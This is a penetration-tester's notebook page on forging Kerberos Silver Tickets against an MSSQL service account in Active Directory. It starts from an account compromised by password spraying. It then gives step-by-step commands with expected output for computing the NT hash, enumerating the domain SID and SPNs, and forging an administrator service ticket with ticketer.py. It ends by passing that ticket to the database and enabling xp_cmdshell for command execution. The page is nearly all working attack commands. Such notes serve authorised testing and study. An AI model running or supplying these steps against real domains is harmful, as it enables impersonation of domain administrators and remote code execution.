---
Primary_category: "[[FORGED TICKETS]]"
title: "SILVER TICKETS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[FORGED TICKETS]]

#### *Theory*

> 🛠️⌛

---

#### *Abuse*

##### *Workflow*

Let's suppose that we compromise a domain service account called *svc_mssql* by performing a ***[[PASSWORD SPRAYING|Password Spraying]]***

Then, we gain remote access to the target and check that there is *MSSQL* instance running on *localhost* as the controlled service account

If would be really interesting to achieve *Code Execution* as the latter as it probably has several impersonation privileges - such as ***[[SEIMPERSONATEPRIVILEGE & SEASSIGNPRIMARYTOKENPRIVILEGE|SeImpersonate]]*** - that we could leverage to takeover the target

So, since we have control over the given service account, we could carry out a *Silver Ticket* attack to craft a valid service ticket as any privileged domain account *( e.g. DA )* to authenticate ourselves to the *MSSQL* instance

##### *Requirements*

- ***Plain Password or NT Hash of the controlled service account***

##### *UNIX-like*

###### *Obtaining an NT Hash*

> ***This step can be skipeed if we already have the NT Hash***

```bash
python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("<PASSWD>").hex())'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("passwordpassword1234$!").hex())' 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> 1485db32ab1ec47a2c5852411dff5274
> ```
>

###### *Enumerating the Domain SID*

```bash
kinit <ACCOUNT>@<DOMAIN>
```

```bash
net rpc info --use-kerberos required -S <DC>
```

> [!DANGER]- *e.g.*
>
> ```bash
> net rpc info --use-kerberos required -S DC.DOMAIN.INTERNAL
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> Domain Name: DOMAIN.INTERNAL
> Domain SID: S-1-5-21-1969309164-1513403977-1686805993
> Sequence number: 1
> Num users: 70
> Num domain groups: 0
> Num local groups: 18
> ```
>

###### *Listing the Service Account's Service Principal Names*

```bash
kinit <ACCOUNT>@<DOMAIN>
```

```bash
ldapsearch -LLL -Q -N -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' '(samAccountName=<SERVICE_ACCOUNT>)' samACcountName servicePrincipalName
```

> [!DANGER]- *e.g.*
>
> ```bash
> ldapsearch -LLL -Q -N -Y GSSAPI -H 'ldap://DC01.DOMAIN.INTERNAL' -b 'DC=DOMAIN,DC=INTERNAL' '(samAccountName=svc_mssql)' samACcountName servicePrincipalName
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> dn: CN=svc_mssql,CN=Users,DC=DOMAIN,DC=INTERNAL
> sAMAccountName: svc_mssql
> servicePrincipalName: MSSQL/DC01.DOMAIN.INTERNAL
> ```
>

###### *Crafting the Service Ticket locally*

```bash
ticketer.py -nthash '<NT_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn '<SPN>' '<IMPERSONATED_USER>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ticketer.py -nthash 'e3a0168bc21cfb88b95c954a5b18f57c' -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain 'DOMAIN.INTERNAL' -spn 'MSSQL/DC01.DOMAIN.INTERNAL' administrator
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Creating basic skeleton ticket and PAC Infos
> [*] Customizing ticket for DOMAIN.INTERNAL/administrator
> [*] 	PAC_LOGON_INFO
> [*] 	PAC_CLIENT_INFO_TYPE
> [*] 	EncTicketPart
> [*] 	EncTGSRepPart
> [*] Signing/Encrypting final ticket
> [*] 	PAC_SERVER_CHECKSUM
> [*] 	PAC_PRIVSVR_CHECKSUM
> [*] 	EncTicketPart
> [*] 	EncTGSRepPart
> [*] Saving ticket in administrator.ccache
> ```
>

###### *Passing the ticket*

> ***Verifying authentication***

```bash
export KRB5CCNAME=$(realpath <SERVICE_TICKET>)
```

```bash
nxc mssql <DC_FQDN> --use-kcache
```

> [!DANGER]- *e.g.*
>
> ```bash
> export KRB5CCNAME=$(realpath administrator@MSSQL_DC01.DOMAIN.INTERNAL@DOMAIN.INTERNAL.ccache)
> ```
>
> ```bash
> nxc mssql DC01.DOMAIN.INTERNAL --use-kcache
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> MSSQL       DC01.DOMAIN.INTERNAL 1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:DOMAIN.INTERNAL) (EncryptionReq:False) 
> MSSQL       DC01.DOMAIN.INTERNAL 1433   NAGOYA           [+] DOMAIN.INTERNAL\administrator from ccache (Pwn3d!)
> ```
>

###### *Gaining RCE as Service Account via xp_cmdshell in a MSSQL Instance*

- ***Authentication***

> ***[[PASS THE TICKET|Pass the Ticket]]***

```bash
export KRB5CCNAME=$(realpath <SERVICE_TICKET>)
```

```bash
mssqlclient.py -k -no-pass '<DOMAIN>/<IMPERSONATED_USER>@<DC_FQDN>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> mssqlclient.py -k -no-pass 'DOMAIN.INTERNAL/administrator@DC01.DOMAIN.INTERNAL'
> ```
>

- ***Command Execution***

```bash
> enable_xp_cmdshell
> xp_cmdshell <COMMAND>
```

##### *Windows*

> 🛠️⌛